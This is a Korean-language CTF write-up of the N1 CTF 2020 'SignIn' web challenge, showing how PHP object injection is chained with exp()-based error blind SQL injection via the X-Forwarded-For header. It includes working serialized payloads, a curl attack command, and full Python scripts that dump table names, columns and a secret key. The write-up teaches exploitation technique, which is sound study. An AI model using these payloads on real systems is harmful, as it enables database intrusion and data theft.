---
layout: post
date: 2020-10-19 00:00:11
title: "N1 CTF 2020 Write Up"
categories: CTF
tags: [SQL Injection]
author:
  - Jeongwon Jo

---
## (Web) SignIn [116 pts]

> SignIn (web) 문제는 PHP Object Injection과 SQL Injection을 이용해 FLAG를 획득하는 문제입니다.

```php
<?php 
class ip {
    public $ip;
    public function waf($info){
    }
    public function __construct() {
        if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
            $this->ip = $this->waf($_SERVER['HTTP_X_FORWARDED_FOR']);
        }else{
            $this->ip =$_SERVER["REMOTE_ADDR"];
        }
    }
    public function __toString(){
        $con=mysqli_connect("localhost","root","********","n1ctf_websign");
        $sqlquery=sprintf("INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')",$this->waf($_SERVER['HTTP_X_FORWARDED_FOR']),time());
        if(!mysqli_query($con,$sqlquery)){
            return mysqli_error($con);
        }else{
            return "your ip looks ok!";
        }
        mysqli_close($con);
    }
}

class flag {
    public $ip;
    public $check;
    public function __construct($ip) {
        $this->ip = $ip;
    }
    public function getflag(){
    	if(md5($this->check)===md5("key****************")){
    		readfile('/flag');
    	}
        return $this->ip;
    }
    public function __wakeup(){
        if(stristr($this->ip, "n1ctf")!==False)
            $this->ip = "welcome to n1ctf2020";
        else
            $this->ip = "noip";
    }
    public function __destruct() {
        echo $this->getflag();
    }

}
if(isset($_GET['input'])){
    $input = $_GET['input'];
	unserialize($input);
} 
```
`ip`라는 클래스를 확인해 보면 먼저 `__construct()` 메서드가 실행이 될 건데, 해당 메서드가 실행이 되면 `X_Forwarded_for`이라는 변수의 존재 유/무를 확인하고, 존재한다면 있다면 `X_Forwarded_for`의 값을 아이피의 값으로 사용하고, 설정이 안 되어 있다면 아이피의 값으로 `Remote_Addr` 값을 넣어 사용하는 것을 볼 수 있습니다.

`__construct()` 메서드가 실행된 후에 `__toString()` 메서드가 실행이 되는 데, 해당 메서드는 클래스 자체를 문자열로 처리를 할 때 실행이 된다고 합니다. 그래서 클래스가 문자열로 처리가 돼서 실행이 되면 `mysqli_query()` 함수를 이용해서 Insert 문 요청을 보내주는 것을 볼 수 있습니다.

```php
class flag {
    public $ip;
    public $check;
    public function __construct($ip) {
        $this->ip = $ip;
    }
    public function getflag(){
    	if(md5($this->check)===md5("key****************")){
    		readfile('/flag');
    	}
        return $this->ip;
    }
    public function __wakeup(){
        if(stristr($this->ip, "n1ctf")!==False)
            $this->ip = "welcome to n1ctf2020";
        else
            $this->ip = "noip";
    }
    public function __destruct() {
        echo $this->getflag();
    }

}
```
`flag`라는 클래스를 확인해 보면 `__construct()` 메서드가 실행이 되면 `$ip`의 값을 `$this->ip`로 넣어주고, 그 다음 `__wakeup()` 메서드가 실행이 되는 데 이때 `$this->i`p의 값이 `n1ctf`이면 `welcome to n1ctf2020`로 값을 바꾸고, `$this->ip`의 값이 `n1ctf`가 아니면 `noip`로 값을 바꿉니다.


그리고 클래스가 파기될 때, `__destruct()` 메서드가 실행되면서 `getflag()` 함수가 실행이 되는데, 이때 `getflag()` 함수에서 `md5($this->check)`의 값이 `Key` 값과 동일하면 `/flag` 파일을 읽어 FLAG를 리턴해주고, 값이 동일하지 않으면 `$this->ip`의 값을 리턴해주는 것을 볼 수 있습니다.

위 소스 코드를 분석한 결과 이번 문제의 요점은 `Key` 값을 찾고, 해당 `Ke`y 값을 이용해 POI를 해서 `FLAG`를 획득하는 문제인 거 같습니다. 하지만 소스 코드를 보면 Key 값은 내부 서버에 있는 소스 코드에서만 볼 수 있을 거 같아서 index.php 파일을 릭 해야 한다고 생각했습니다.

여기서 첫 번째 난간, SQL I를 어떻게 하지? POI -> SQLI?

SQL 로직이 그냥 주어지진 않았을 것 같아서 SQLI을 의심해보았습니다. 그래서 `ip` 클래스에서 `__toString()` 메서드를 이용해서 블라인드 SQL 인젝션을 통해 파일을 찾고, 파일을 릭 한다면 해당 Key로 FLAG를 찾는 방법으로 시나리오를 먼저 구성했습니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Ft2kvu%2FbtqK83qQ8VI%2FMBhwxD4ZlaFTQRC94WNLA1%2Fimg.png)

```
O:2:"ip":0:{}
```
그래서 위 페이로드를 작성해서 보내 보았지만 예상과 다르게 SQL 에러도 출력이 되지 않았고, `your ip looks ok!`라는 문구도 출력이 되지 않았습니다. 즉, __toString() 메서드가 실행이 되지 않은 것입니다.

여기서 `__toString()` 메서드가 실행이 되지 않은 이유는 하나 일 것입니다. 해당 클래스가 `문자열`로 처리를 하지 않기 때문에 __toString() 메서드가 반응을 하지 않는 것입니다.

그런데 `flag` 클래스에서 `stristr()` 함수를 사용하고 있는 것을 볼 수 있었습니다. 만약 $this->ip의 값으로 `ip` 클래스를 넘겨주면 어떻게 될까 생각을 해본 결과, 문자열 함수로 클래스가 들어가면 해당 클래스도 문자열로 처리가 되는 거겠지?라고 생각을 했습니다.

```php
public function __wakeup(){
	if(stristr($this->ip, "n1ctf")!==False)
		$this->ip = "welcome to n1ctf2020";
	else
		$this->ip = "noip";
}
```
하지만 `stristr()` 함수에서 `__toString()` 메서드가 실행이 되면 `$this->ip`의 값으로 `mysqli Error`를 리턴 받거나, `your ip looks ok!`라는 문구를 리턴을 받을 것이고, 그럼 항상 "noip" 문구가 출력이 될 것입니다.

그래서 SQL 쿼리를 조작해서 `IF` 문을 사용해 쿼리가 참이면 에러를 출력시키게 하고, 해당 에러에 `n1ctf` 문자가 출력이 되게 하면??? 블라인드 SQL 인젝션이 가능하지 않을까 생각을 해보았습니다. stristr() 함수는 `n1ctf`라는 문자열의 패턴만 존재해도 참으로 인식합니다. 그러니 `afwefwfn1ctf`라는 값이 들어와도 해당 값에는 `n1ctf`라는 패턴이 존재하기 때문에 참으로 처리가 될 것입니다.

 그래서 mysql에서 에러에 내가 원하는 값을 어떻게 넣어주지 생각을 해보다가, 얼마 전에 exp() 함수를 이용한 `Error Blind Based SQL Injection` 글을 작성하면서 exp() 함수를 사용한 것이 생각났습니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FFl7sF%2FbtqK70ajhMF%2FfCXjSjcKyHtlrUR5mJAkz0%2Fimg.png)

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbojSKw%2FbtqK83dlzoE%2FclyndiA3KIdFPHqz7UF2xK%2Fimg.png)

그래서 `mysql`에서 테스트를 해보니 역시나 에러를 보니 `n1ctf`라는 문자열이 들어가 있는 것을 볼 수 있었습니다. 해당 함수가 에러를 내뱉는 이유는 exp() 함수에 `Max Value`가 709입니다. 

710부터는 오버플로우가 일어나 에러를 내뱉게 되는 데, 위 사진을 보면 709 * length("n1ctf")인 것을 볼 수 있습니다. length("n1ctf")의 값은 5이므로 709 * 5가 되어 오버플로우가 발생해 에러를 내 뱉는 것이고, 해당 에러는 사용자가 입력한 exp() 함수를 그대로 출력해주기 때문에 우리가 원하는 값을 에러에 포함시킬 수도 있습니다.

```
POI Payload Used : O:4:"flag":1:{s:2:"ip";O:2:"ip":0:{}}
SQLI Payload Used : ',if(1=1, exp(709 * length("n1ctf")), "False"))#
```
위와 같이 값을 보내게 되면 일단 `POI Payload`에 의해서 `__toString()` 메서드가 실행이 될 것입니다. (이유는 위에) 그리고 `X-Forwarded-fo`r의 값으로 `SQLI Payload`를 보내주면 `Insert` 문에 들어갈 것 이기 때문에 Injection이 일어날 것입니다.

`SQLI Payload`를 보면 if문 조건이 1=1으로 참이므로, 에러에 `n1ctf` 문구가 포함되어 리턴이 될 것입니다. 해당 리턴 값은 stristr() 함수의  `$this->ip`로 들어가고, `$this->ip`에는 `n1ctf` 문구가 포함되어 있어 `welcome to n1ctf2020`이 출력이 될 것입니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FBPeP3%2FbtqK6B3CNsz%2F1AlxnouxJ8L7TO9JKfU8pK%2Fimg.png)

```
Command : curl -i -g --header "X-Forwarded-for: ',if(1=1, exp(709 * length('n1ctf')), 'False'))#" http://101.32.205.189/?input=O:4:%22flag%22:1:{s:2:%22ip%22;O:2:%22ip%22:0:{}}
```
그래서 `curl` 명령어를 이용해서 `POI -> SQLI` 공격을 해보니 조건이 딱 맞아 `welcome to n1ctf2020`이 출력되는 것을 볼 수 있습니다. 이제 이를 기반으로 load_file() 함수를 이용해서 index.php 파일을 릭 하기만 하면 될 거 같습니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fcmhkpv%2FbtqK83LcqPw%2FNvMFdQL2fLyDbRX3KSCI21%2Fimg.png)

그런데 `load_file()` 함수를 이용해서 `index.php` 파일을 릭 해보려고 했지만 잘 되지 않았습니다. 검색을 해보니 `secure_file_priv` 옵션을 이용해서 디렉터리를 제어할 수 있는 것을 알 수 있었습니다. 검색을 해보니 `@@global.secure_file_priv`를 참조해서 제어하고 있는 디렉터리를 볼 수 있는 거 같아서 이를 블라인드 인젝션을 이용해서 뽑아보았습니다.

```python
import requests

url = "http://101.32.205.189/?input=O:4:%22flag%22:1:{s:2:%22ip%22;O:2:%22ip%22:0:{}}"
Length , path= 0, ""
headers = {"X-Forwarded-for":""}


for i in range(100):
	payload = "',if((SELECT length(@@global.secure_file_priv))={}, exp(709 * length('n1ctf')), 'False'))#"
	headers["X-Forwarded-for"] = payload.format(i)
	res = requests.get(url, headers=headers)
	if "<code>noip</code>" not in res.text:
		Length = i
		print("[+] secure_file_priv Length : {}".format(str(i)))
		break

for i in range(Length):
	for j in range(47, 123):
		payload = "',if((substr((SELECT @@global.secure_file_priv),{},1))='{}', exp(709 * length('n1ctf')), 'False'))#"
		headers["X-Forwarded-for"] = payload.format(i+1, chr(j))
		res = requests.get(url, headers=headers)
		if "<code>noip</code>" not in res.text:
			path += chr(j).lower()
			print("[+] secure_file_priv : {}".format(path))
			break
```
![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcVMXwj%2FbtqLbmjp46q%2F7gIYYWE5cTMmTEKfTg5pBK%2Fimg.png)

작성한 익스플로잇 코드를 돌려보니 `@@global.secure_file_priv` 값이 `/var/lib/mysql/files`인 것을 볼 수 있었습니다. 이렇기 때문에 /var/www/html에 있는 index.php 파일을 릭할 수 없었던 거 같습니다.

하지만 이번 문제는 `SQLI`를 이용해서 `Key` 값을 찾는 거 외에는 방법이 없는 거 같아서 DB를 그냥 털기로 마음먹었습니다. 

```python
import requests

url = 'http://101.32.205.189/?input=O:4:%22flag%22:1:{s:2:%22ip%22;O:2:%22ip%22:0:{};}'

table_1, table_len2, table_2, column_len1, column_len2, column1, column2, key_len, key = "", 0, "", 0, 0, "", "", 0, ""
headers = {"X-Forwarded-For":""}
def table_name1():
	global table_1
	payload = "',if((substr((select table_name from information_schema.tables where table_schema='n1ctf_websign' limit 0, 1),{},1)='{}'), exp(709 * length('n1ctf')),'False'))#"
	for i in range(4):
		for j in range(44, 122):
			headers = {"X-Forwarded-For": payload.format(i+1, chr(j))} 
			res = requests.get(url, headers=headers)
			if "<code>noip</code>" not in res.text:
				table_1 += chr(j)
				print("[+] One_Table_Name : {}".format(table_1.lower()))
				break

def table_len2():
	global table_len2
	payload = "',if((select length(table_name) from information_schema.tables where table_schema='n1ctf_websign' limit 1,1) ={}, exp(709 * length('n1ctf')),'False'));#" 
	for i in range(100):
		headers["X-Forwarded-for"] = payload.format(i)
		res = requests.get(url,headers=headers)
		if "<code>noip</code>" not in res.text:
			table_len2 = i
			print("[+] Two_Table_Name Length : {}".format(str(table_len2)))
			break

def table_name2():
	global table_2
	payload = "',if((substr((select table_name from information_schema.tables where table_schema='n1ctf_websign' limit 1, 1),{},1)='{}'), exp(709 * length('n1ctf')),'False'))#"
	for i in range(table_len2):
		for j in range(44, 122):
			headers["X-Forwarded-for"] = payload.format(i+1, chr(j))
			res = requests.get(url, headers=headers)
			if "<code>noip</code>" not in res.text:
				table_2 += chr(j).lower()
				print("[+] Two_Table_Name : {}".format(table_2))
				break	

def table_name2_column():
	global column_len1, column_len2
	payload = "',if((select length(column_name) from information_schema.columns where table_schema ='n1ctf_websign' and table_name = '{}' limit {},1) ={}, exp(709 * length('n1ctf')),'False'))#"
	for j in range(2):
		for i in range(100):
			headers["X-Forwarded-for"] = payload.format(table_2, j, i)
			res = requests.get(url, headers=headers)
			if "<code>noip</code>" not in res.text:
				if j == 0:
					column_len1 = i
				elif j == 1:
					column_len2 = i
				print("[+] {}, {}_Column_Name Length : {}".format(table_2, str(j+1), str(i)))
				break

def column():
	global column1, column2
	payload = "',if((substr((select column_name from information_schema.columns where table_schema='n1ctf_websign' and table_name = '{}' limit {},1),{},1)='{}'), exp(709 * length('n1ctf')),'False'));#"
	for i in range(2):
		if i == 0:
			Len = 2
		elif i == 1:
			Len = 3
		for j in range(Len):
			for k in range(48, 123):
				headers["X-Forwarded-for"] = payload.format(table_2, i, j+1, chr(k))
				if k == 92:
					break
				res = requests.get(url, headers=headers)
				if "<code>noip</code>" not in res.text:
					if i == 0:
						column1 += chr(k).lower()
						print("[+] n1key, 1_Column_Name : {}".format(column1))
						break
					elif i == 1:
						column2 += chr(k).lower()
						print("[+] n1key, 2_Column_Name : {}".format(column2))

def keylen():
	global key_len
	payload = "',if((select length(`key`) from {})={}, exp(709 * length('n1ctf')),'False'));#"
	for i in range(100):
		headers["X-Forwarded-for"] = payload.format(table_2, i)
		res = requests.get(url, headers=headers)
		if "<code>noip</code>" not in res.text:
			key_len = i
			print("[+] n1key, Key Length : {}".format(str(i)))
			break

def Key():
	global key
	payload = "',if((substr((select `key` from {}),{},1)='{}'), exp(709 * length('n1ctf')),'False'));#"
	for i in range(25):
		for j in range(48, 123):
			headers["X-Forwarded-for"] = payload.format(table_2, i+1, chr(j))
			res = requests.get(url, headers=headers)
			if "<code>noip</code>" not in res.text:
				key += chr(j).lower()
				break
	print("[+] n1key, Key : {}".format(key))

def flag():
	url = 'http://101.32.205.189/?input=O:4:"flag":1:{s:5:"check";s:25:"' + key + '"}'
	res = requests.get(url)
	flag = res.text.split("</code")[1].split("<code>")[0].replace("\n","").replace(">","")
	print("[+] " + flag)


def main():
	table_name1()
	table_len2()
	table_name2()
	table_name2_column()
	column()
	keylen()
	Key()
	#flag()

if __name__ == '__main__':
	print("[+] Start")
	main()
```
![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FdbezPc%2FbtqK7BaOTRJ%2FKevJzpGaeCCMJe09wkZ5u1%2Fimg.png)

익스플로잇 코드를 하나하나 짜서 확인해보니 마지막에 `key`라는 칼럼이 존재하는 것을 알게 됐고, `key` 값에 문제에서 원하는 `key` 값이 존재하는 것을 볼 수 있었습니다. 

```
http://101.32.205.189/?input=O:4:%22flag%22:1:{s:5:%22check%22;s:25:%22n1ctf20205bf75ab0a30dfc0c%22}
```
 
마지막으로 뽑은 Key 값을 이용해서 `POI`를 해주니 `FLAG`를 출력해주는 것을 볼 수 있었습니다. Error Based Blind SQL Injection (EXP 함수 활용) 글 작성하고 여기서 쓰이군요 :)

> FLAG : n1ctf{you_g0t_1t_hack_for_fun}

---
